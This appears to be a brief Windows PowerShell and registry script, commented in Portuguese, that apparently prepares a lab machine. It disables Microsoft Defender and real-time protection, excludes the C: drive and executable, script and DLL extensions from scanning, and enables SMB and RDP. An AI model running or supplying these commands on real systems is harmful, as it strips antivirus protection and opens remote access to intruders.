reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".ps1"
Add-MpPreference -ExclusionExtension ".dll"


# Habilite o serviço SMB
Set-Service -Name "LanmanServer" -StartupType 'Automatic'
Start-Service -Name "LanmanServer"

# Habilite o serviço RDP

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

#comandos para baixar security.evtx e sysmon.evtx



Restart-Computer
